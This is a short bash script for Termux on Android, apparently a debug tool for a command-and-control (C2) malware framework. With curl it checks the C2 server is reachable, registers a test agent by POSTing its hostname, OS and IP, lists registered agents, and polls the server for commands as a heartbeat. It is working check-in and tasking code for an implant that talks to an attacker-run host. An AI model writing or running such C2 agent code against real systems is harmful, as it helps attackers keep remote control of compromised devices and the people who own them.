#!/data/data/com.termux/files/usr/bin/bash

# Debug script to test agent registration

C2="http://{C2_HOST}:{C2_PORT}"
HOSTNAME="DEBUG_AGENT_$(date +%s)"

echo "Testing C2 server connectivity..."
echo "C2 Server: $C2"

# Test 1: Basic connectivity
echo "Test 1: Basic connectivity"
response=$(curl -s "$C2")
if [ -n "$response" ]; then
    echo "✓ C2 server is reachable"
else
    echo "✗ C2 server is not reachable"
    exit 1
fi

# Test 2: Registration
echo "Test 2: Agent registration"
registration_data="{\"hostname\":\"$HOSTNAME\",\"os\":\"Android Debug Test\",\"ip\":\"127.0.0.1\"}"
echo "Registration data: $registration_data"

response=$(curl -s -X POST "$C2/register" \
    -H "Content-Type: application/json" \
    -d "$registration_data")

echo "Registration response: $response"

if [ "$response" = "OK" ]; then
    echo "✓ Registration successful"
else
    echo "✗ Registration failed"
fi

# Test 3: Check if agent appears in list
echo "Test 3: Check agent list"
sleep 2
agents_response=$(curl -s "$C2/agents")
echo "Agents response: $agents_response"

# Test 4: Send heartbeat
echo "Test 4: Send heartbeat"
heartbeat_response=$(curl -s "$C2/command/$HOSTNAME")
echo "Heartbeat response: $heartbeat_response"

# Test 5: Check agent list again
echo "Test 5: Check agent list again"
sleep 2
agents_response2=$(curl -s "$C2/agents")
echo "Agents response after heartbeat: $agents_response2"

echo "Debug test completed"
